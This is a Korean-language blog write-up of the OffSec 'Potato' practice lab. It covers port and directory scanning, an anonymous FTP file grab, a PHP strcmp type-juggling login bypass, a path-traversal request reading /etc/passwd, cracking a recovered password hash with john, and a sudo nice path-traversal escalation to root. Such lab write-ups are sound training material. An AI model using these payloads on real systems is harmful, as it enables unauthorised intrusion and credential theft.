---
title: "Potato Writeup"
date: 2025-09-02T00:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab Potato Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Local DNS 등록하기
``` shell
sudo vi /etc/hosts
```
``` plain text
192.168.138.101 target
```

## Enumeration
### Nmap
```shell
sudo nmap -p- target
```
* `nmap -p-`는 대상 호스트의 모든 TCP 포트(1번부터 65535번까지)를 스캔하라는 의미입니다.

```plain text
Nmap scan report for target (192.168.138.101)
Host is up (0.10s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2112/tcp open  kip
```

```shell
sudo nmap -p 2112 target -sC -sV
```
* `2112` 포트에 대한 추가적인 enumeration을 할 수 있습니다.
* `sC` 옵션은 NSE 스크립트를 통한 취약점 스캔이고, `sV` 옵션은 버전 스캐닝 옵션입니다.
```plain text
PORT     STATE SERVICE VERSION
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

### Gobuster
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -z
```
* `dir` 모드는 디렉토리 검색을 의미합니다.
* `-u` 옵션은 스캔할 대상 url을 지정합니다.
* `-w` 옵션은 wordlist의 경로를 지정하는 옵션입니다.
* `-z` 옵션은 터미널 프로그레스 출력을 비활성화하는 옵션입니다.
```plain text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 271]
/.htaccess            (Status: 403) [Size: 271]
/.htpasswd            (Status: 403) [Size: 271]
/admin                (Status: 301) [Size: 300] [--> http://target/admin/]
/index.php            (Status: 200) [Size: 245]
/server-status        (Status: 403) [Size: 271]
===============================================================
Finished
===============================================================
```

## Exploitation
### Anonymous ProFTP Server
```shell
ftp target 2112
```
```plaintext
ftp> ls
229 Entering Extended Passive Mode (|||48351|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg

ftp> get index.php.bak
local: index.php.bak remote: index.php.bak
229 Entering Extended Passive Mode (|||36430|)
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
   901        9.44 MiB/s
226 Transfer complete
```
* ftp 서버에 접근하여 `index.php.bak` 파일을 가져옵니다.
* anonymous 접근시 유저네임을 `anonymous` 로 지정하고, 패스워드는 입력하지 않으면 됩니다.

### PHP Type Juggling and Authentication Bypass

* php에는 두가지 타입의 comparison이 있습니다. 하나는 strict comparison(`===`)이고, 다른 하나는 loose comparison(`==`)입니다.
* string comparator function `strcmp` 에서 string이 아닌 인풋이 입력되면 함수는 `NULL` 을 반환하고, `NULL == 0` loose comparison은 참을 반환하게 됩니다.

``` php
<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>
```
* 위 php파일을 보면 `strcmp` 함수의 반환값을 loose comparator로 0과 비교하고 있습니다.

``` plain text
POST /admin/index.php?login=1 HTTP/1.1
...

username=admin&password[]=""
```
* Burp를 통해 password에 array를 전달합니다.

``` plain text
POST /admin/dashboard.php?page=log HTTP/1.1
...


file=../../../../../../../../../../etc/passwd
```
* log파일을 다운로드 할 수 있는 기능이 있습니다. LFI(Local File Inclusion)을 통해 /etc/passwd 파일을 출력합니다.

```shell
cat pass.txt
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin:/home/webadmin:/bin/bash
```
```shell
john pass.txt

Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
dragon           (webadmin)
1g 0:00:00:00 DONE 2/3 (2025-09-01 22:56) 16.66g/s 24200p/s 24200c/s 24200C/s 123456..keith
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
* webadmin의 passwd row를 john을 통해 해시 크래킹을 시도합니다.
* 결과로 나온 패스워드는 `dragon` 입니다.

## Privilege Escalation


```
sudo -l
```
* sudo -l옵션을 통해 해당 사용자가 사용할 수 있는 명령어를 확인합니다.

```shell
User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```


```shell
echo "/bin/bash" > bash.sh
chmod +x bash.sh
sudo /bin/nice /notes/../home/webadmin/bash.sh
```
* 사용자의 홈 디렉토리에 bash를 실행하는 스크립트를 생성한 뒤, 파일 경로를 우회하여 스크립트를 실행합니다.

